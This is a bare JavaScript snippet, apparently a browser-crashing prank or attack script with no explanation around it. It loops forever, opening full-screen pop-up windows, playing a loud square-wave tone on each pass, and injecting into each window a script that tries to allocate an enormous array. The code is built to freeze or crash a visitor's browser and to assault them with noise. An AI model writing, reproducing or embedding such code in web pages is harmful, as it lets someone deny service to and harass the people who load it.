while(true) {
  var a=Math.floor(10000*Math.random()+1),
  b=window.open('_blank','Lag'+a,`height=${screen.height},width=${screen.width}`);
  au=new AudioContext(); v=au.createOscillator(); u=au.createGain(); v.connect(u); v.frequency.value=130; v.type="square"; u.connect(au.destination); u.gain.value=100*0.01; v.start(au.currentTime); v.stop(au.currentTime+300*0.001);
  b.document.body.innerHTML='<script>[...Array(2**32-1)]</script>';
}